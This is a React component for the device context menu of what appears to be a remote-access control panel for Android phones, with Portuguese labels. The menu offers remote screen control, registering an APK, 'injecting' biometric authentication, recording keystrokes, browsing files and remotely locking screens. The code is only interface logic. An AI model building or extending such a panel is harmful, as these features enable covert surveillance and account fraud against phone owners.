import { useEffect, useRef } from "react";
import {
  Copy,
  Edit3,
  ExternalLink,
  Fingerprint,
  FolderTree,
  Keyboard,
  Layers,
  Link2,
  Lock,
  RotateCw,
  ShieldCheck,
  Smartphone,
  Trash2,
  Unlock,
  Zap
} from "lucide-react";
import type { ControlDevice, ControlTool } from "./types";

interface Props {
  x: number;
  y: number;
  device: ControlDevice;
  onClose: () => void;
  onSelectDevice: (device: ControlDevice) => void;
  onOpenTool: (tool: ControlTool) => void;
  onOpenFloating: (device: ControlDevice) => void;
  onPopoutDesktop: (device: ControlDevice) => void;
  onToggleLock: (device: ControlDevice) => void;
  onTriggerBiometric: (device: ControlDevice) => void;
  onValidateIsland: (device: ControlDevice) => void;
  onReconnect: (device: ControlDevice) => void;
  onDelete: (device: ControlDevice) => void;
  onEditDevice?: (device: ControlDevice) => void;
  onCopyDirectUrl?: (device: ControlDevice) => void;
  onCopyEncryptedUrl?: (device: ControlDevice) => void;
}

export function DeviceContextMenu({
  x,
  y,
  device,
  onClose,
  onSelectDevice,
  onOpenTool,
  onOpenFloating,
  onPopoutDesktop,
  onToggleLock,
  onTriggerBiometric,
  onValidateIsland,
  onReconnect,
  onDelete,
  onEditDevice,
  onCopyDirectUrl,
  onCopyEncryptedUrl
}: Props) {
  const menuRef = useRef<HTMLDivElement>(null);

  // Close on click outside or Escape key
  useEffect(() => {
    const handleDown = (e: MouseEvent) => {
      if (menuRef.current && !menuRef.current.contains(e.target as Node)) {
        onClose();
      }
    };
    const handleKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    };

    window.addEventListener("mousedown", handleDown);
    window.addEventListener("keydown", handleKey);
    return () => {
      window.removeEventListener("mousedown", handleDown);
      window.removeEventListener("keydown", handleKey);
    };
  }, [onClose]);

  // Viewport bounds clamp
  const menuWidth = 230;
  const menuHeight = 390;
  const clampedX = Math.max(10, Math.min(x, window.innerWidth - menuWidth - 10));
  const clampedY = Math.max(10, Math.min(y, window.innerHeight - menuHeight - 10));

  const handleAction = (cb: () => void) => {
    onSelectDevice(device);
    cb();
    onClose();
  };

  return (
    <div
      ref={menuRef}
      className="tactical-context-menu"
      style={{
        position: "fixed",
        left: `${clampedX}px`,
        top: `${clampedY}px`,
        zIndex: 99999,
        width: `${menuWidth}px`
      }}
      onClick={(e) => e.stopPropagation()}
    >
      {/* Menu Header with Device Info */}
      <div className="context-menu-device-header">
        <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
          <Smartphone size={13} style={{ color: "#38bdf8" }} />
          <span className="context-menu-title" title={device.name}>
            {device.name}
          </span>
        </div>
        <span className="context-menu-sub">{device.ip}</span>
      </div>

      <div className="context-menu-divider" />

      {/* Main Actions */}
      <button
        type="button"
        className="context-menu-item primary-action"
        onClick={() => handleAction(() => onOpenTool("tela"))}
      >
        <Zap size={14} style={{ color: "var(--crimson-neon, #ff1a2a)" }} />
        <span>Abrir Controle & Tela</span>
      </button>

      <button
        type="button"
        className="context-menu-item"
        onClick={() => handleAction(() => onEditDevice?.(device))}
        title="Editar nome do contato, telefone e APK cadastrado"
      >
        <Edit3 size={14} style={{ color: "#38bdf8" }} />
        <span style={{ color: "#38bdf8", fontWeight: 700 }}>Editar Contato & APK</span>
      </button>

      <button
        type="button"
        className="context-menu-item"
        onClick={() => handleAction(() => onTriggerBiometric(device))}
        title="Injetar autenticação de biometria cadastrada no dispositivo"
      >
        <Fingerprint size={14} style={{ color: "#a855f7" }} />
        <span style={{ color: "#c084fc", fontWeight: 700 }}>Simular / Injetar Biometria</span>
      </button>

      {onCopyEncryptedUrl && (
        <button
          type="button"
          className="context-menu-item"
          onClick={() => handleAction(() => onCopyEncryptedUrl(device))}
          title="Copiar Link Seguro Criptografado (AES-256-GCM) para esta instância"
        >
          <ShieldCheck size={14} style={{ color: "#00f0ff" }} />
          <span style={{ color: "#00f0ff", fontWeight: 700 }}>🔒 Copiar URL Criptografado</span>
        </button>
      )}

      {onCopyDirectUrl && (
        <button
          type="button"
          className="context-menu-item"
          onClick={() => handleAction(() => onCopyDirectUrl(device))}
          title="Copiar Link Direto para esta instância de aparelho"
        >
          <Link2 size={14} style={{ color: "#cbd5e1" }} />
          <span>🔗 Copiar Link da Instância</span>
        </button>
      )}

      <div className="context-menu-divider" />

      {/* Tools Shortcut */}
      <button
        type="button"
        className="context-menu-item"
        onClick={() => handleAction(() => onOpenTool("teclado"))}
      >
        <Keyboard size={14} style={{ color: "#ec4899" }} />
        <span>Gravação de Digitação / Teclas</span>
      </button>

      <button
        type="button"
        className="context-menu-item"
        onClick={() => handleAction(() => onOpenTool("arquivos"))}
      >
        <FolderTree size={14} style={{ color: "#94a3b8" }} />
        <span>Gerenciador de Arquivos</span>
      </button>

      <button
        type="button"
        className="context-menu-item"
        onClick={() => handleAction(() => onValidateIsland(device))}
      >
        <ShieldCheck size={14} style={{ color: "#38bdf8" }} />
        <span>Validar Perfil Island</span>
      </button>

      <div className="context-menu-divider" />

      {/* Windows & Power */}
      <button
        type="button"
        className="context-menu-item"
        onClick={() => handleAction(() => onOpenFloating(device))}
      >
        <Layers size={14} style={{ color: "#22c55e" }} />
        <span>Abrir Janela Flutuante (MEmu)</span>
      </button>

      <button
        type="button"
        className="context-menu-item"
        onClick={() => handleAction(() => onPopoutDesktop(device))}
      >
        <ExternalLink size={14} style={{ color: "#38bdf8" }} />
        <span>Desencaixar Janela Desktop</span>
      </button>

      <button
        type="button"
        className="context-menu-item"
        onClick={() => handleAction(() => onToggleLock(device))}
      >
        {device.screenLocked ? (
          <>
            <Unlock size={14} style={{ color: "#22c55e" }} />
            <span>Desbloquear Tela</span>
          </>
        ) : (
          <>
            <Lock size={14} style={{ color: "#eab308" }} />
            <span>Bloquear Tela</span>
          </>
        )}
      </button>

      <button
        type="button"
        className="context-menu-item"
        onClick={() => handleAction(() => onReconnect(device))}
      >
        <RotateCw size={14} style={{ color: "#38bdf8" }} />
        <span>Reconectar / Sincronizar</span>
      </button>

      <div className="context-menu-divider" />

      {/* Danger Zone */}
      <button
        type="button"
        className="context-menu-item danger-item"
        onClick={() => handleAction(() => onDelete(device))}
      >
        <Trash2 size={14} style={{ color: "#ef4444" }} />
        <span>Desvincular Aparelho</span>
      </button>
    </div>
  );
}
